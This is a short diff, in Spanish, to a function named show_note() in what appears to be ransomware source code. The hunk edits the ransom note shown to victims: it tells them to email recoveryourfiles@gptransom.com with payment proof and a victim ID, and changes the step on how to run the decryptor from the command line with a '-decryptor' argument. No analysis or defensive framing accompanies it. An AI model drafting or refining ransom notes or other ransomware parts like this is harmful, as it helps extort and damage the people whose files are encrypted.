@@ -31,7 +31,8 @@ def show_note():
   3. Envía un correo a recoveryourfiles@gptransom.com con el comprobante de pago y tu ID de víctima:
     ID DE VÍCTIMA: {agent_id}
 
-  4. Una vez confirmado el pago, recibirás la clave y el software de descifrado.
+  4. Una vez confirmado el pago, podrás ejecutar el software de descifrado desde la consola (CMD) 
+  accediendo a la ubicación del ejecutable y utilizando el argumento "-decryptor".
 
   -----------------------------
   ¡ADVERTENCIAS!
